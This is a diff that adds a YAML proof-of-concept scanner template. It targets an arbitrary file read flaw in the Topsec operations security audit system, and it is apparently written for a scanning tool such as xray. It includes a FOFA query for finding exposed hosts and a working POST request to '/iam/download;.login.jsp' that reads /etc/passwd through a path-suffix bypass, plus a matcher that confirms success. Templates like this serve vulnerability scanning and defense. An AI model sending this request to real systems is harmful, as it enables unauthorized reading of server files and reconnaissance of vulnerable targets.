@@ -1,0 +1,18 @@
+id: poc-yaml-topsec-topsag-download-anyfile-read
+info:
+  name: 天融信运维安全审计系统 download 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 天融信运维安全审计系统
+  fofa: header="iam" && server="Apache-Coyote/"
+requests:
+- method: POST
+  path: /iam/download;.login.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: filename=1.txt&filepath=/etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && contains(headers,"filename=1.txt") && !contains(body,"<")
+variables: {}
+transport: http
